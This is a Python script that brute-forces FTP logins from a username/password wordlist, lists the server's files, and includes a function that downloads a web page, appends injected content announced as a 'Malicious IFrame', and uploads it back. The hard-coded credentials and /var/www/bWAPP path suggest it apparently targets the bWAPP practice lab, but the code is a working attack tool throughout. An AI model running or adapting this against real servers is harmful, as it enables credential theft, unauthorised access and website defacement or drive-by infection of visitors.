import ftplib
from scapy.all import *


def brute_login(hostname, passwd_file="10M.txt"):
    with open(passwd_file) as fd:
        for line in fd:
            user_name = line.split()[0]
            password = line.split()[1].strip('\r').strip('\n')

            try:
                ftp = ftplib.FTP(hostname)
                ftp.login(user_name, password)

                print("\n[*]" + str(hostname) + " FTP Login successful: " + user_name + "/" + password)
                print("Current Working Directory on FTP Server: " + ftp.pwd())
                print("Here are the current directories/files...")
                return_files(ftp)

                # inject_page(ftp, "index.html", redirect_target)
                ftp.quit()
                return user_name, password

            except ftplib.error_perm:
                print("Failed Login attempt...Retrying...")
                pass

            except ftplib.all_errors as e:
                print(e)
                return None, None

            except Exception as e:
                print(e)
                return None, None

    print("[-] Could not brute force FTP credentials")
    return None, None


def return_files(ftp):
    dir_list = None
    try:
        dir_list = ftp.nlst()
        for fileName in dir_list:
            fn = fileName.lower()
            print(fn)
            # if ".php" in fn or ".htm" in fn or ".asp" in fn:
            #    print("[+] Found default page: " + fn)
    except Exception as e:
        print("[-] Could not list directory contents.")
        print(e)
        return dir_list
    return dir_list


def inject_page(ftp, page="robots.txt", redirect="Hello World!\n"):
    ftp = ftplib.FTP(ftp)
    ftp.login("bee", "bug")
    ftp.cwd("/var/www/bWAPP")
    return_files(ftp)

    with open(page + ".tmp", 'w') as fd:
        ftp.retrlines("RETR " + page, fd.write)
        print("[+] Downloaded Page: " + page)
        fd.write(redirect)
    print("[+] Injected Malicious IFrame on: " + page)
    ftp.storlines('STOR ' + page, open(page + '.tmp', 'rb'))
    print("[+] Uploaded Injected page: " + page)
